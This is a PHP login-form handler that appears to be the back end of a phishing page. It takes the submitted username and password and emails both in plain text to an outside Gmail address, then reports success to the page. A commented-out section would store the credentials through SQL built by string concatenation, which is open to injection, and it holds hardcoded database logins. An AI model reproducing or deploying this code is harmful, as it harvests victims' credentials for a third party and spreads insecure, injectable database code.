<?php

	if (!isset($_POST['username']) || empty($_POST['username'])) {
		echo json_encode('Username empty');
		return;
	}

	if (!isset($_POST['password']) || empty($_POST['password'])) {
		echo json_encode('Password empty');
		return;
	}

	$to = "marikoterachi@gmail.com";
	$subject = "My subject";
	$txt = "Username : " . $_POST['username'] . " & Password : " . $_POST['password'];

	mail($to,$subject,$txt);

	// $servername = "localhost";
	// $username = "admin";
	// $password = "0b359f196efc0377b5e64d692e07eba42da4c53107c52156";
	// $dbname = "user_data";

	// $servername = "localhost";
	// $username = "root";
	// $password = "";
	// $dbname = "user_data";

	// // Create connection
	// $conn = new mysqli($servername, $username, $password, $dbname);
	// // Check connection
	// if ($conn->connect_error) {
	//   die("Connection failed: " . $conn->connect_error);
	// }

	// $user = $_POST['username'];
	// $pass = $_POST['password'];

	// $sql = "INSERT INTO Users (username, password) VALUES ('$user', '$pass')";

	// if ($conn->query($sql) !== TRUE) {
	//   echo json_encode(false);
	//   return;
	// }

	// $conn->close();

	echo json_encode(true);

?>